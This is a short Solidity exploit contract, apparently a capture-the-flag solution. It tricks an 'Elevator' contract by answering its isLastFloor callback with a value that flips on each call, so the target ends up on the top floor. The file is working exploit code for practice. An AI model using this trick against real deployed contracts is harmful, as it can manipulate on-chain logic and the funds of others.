
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface IElevator {
    function goTo(uint _floor) external;
}

contract ElevatorHack {
    bool public response = true;

    function hack(address _target) external {
        IElevator elevator = IElevator(_target);
        elevator.goTo(1);
    }

    function isLastFloor(uint) external returns (bool) {
        response = !response;
        return response;
    }
}